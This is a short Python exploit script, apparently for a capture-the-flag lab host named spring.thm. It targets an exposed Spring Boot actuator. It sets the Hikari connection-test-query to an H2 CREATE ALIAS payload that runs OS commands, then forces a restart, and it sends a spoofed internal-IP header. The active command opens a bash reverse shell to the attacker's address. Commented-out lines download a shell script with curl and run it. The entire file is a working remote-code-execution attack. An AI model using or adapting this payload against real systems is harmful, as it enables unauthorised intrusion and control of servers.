import requests

our_ip = "10.6.32.20"
url = "https://spring.thm"

#cmd = f"bash -c 'bash -i >& /dev/tcp/{our_ip}/7777 0>&1'"
#cmd = f"curl http://{our_ip}:8000/from_python_launcher"
#cmd = f"curl http://{our_ip}:8000/rev2.sh -o /tmp/rev2.sh"
#cmd = f"/bin/bash /tmp/rev2.sh"
cmd = 'python3 -c "import os; os.system(\\"bash -c'
cmd += f" 'bash -i >& /dev/tcp/{our_ip}/7777 0>&1'\\\")\""
#cmd = f"""python3 -c "import os; os.system(\"bash -c 'bash -i >& /dev/tcp/{our_ip}/7777 0>&1'\")""""
print(cmd)

data = {
	'name': 'spring.datasource.hikari.connection-test-query',
	'value': f"CREATE ALIAS EXEC AS CONCAT('String shellexec(String cmd) throws java.io.IOException {{ java.util.Scanner s = new',' java.util.Scanner(Runtime.getRun','time().exec(cmd).getInputStream());  if (s.hasNext()) {{return s.next();}} throw new IllegalArgumentException(); }}');CALL EXEC('{cmd}');"
}

headers = {
    'x-9ad42dea0356cb04': '172.16.0.3'
}

print(f"Inserting cmd {cmd}")
r = requests.post(f"{url}/actuator/env", json=data, headers=headers, verify=False)

r = requests.post(f"{url}/actuator/restart", headers=headers, verify=False)
print(r.text)

print("Should get callback in a couple of secs")

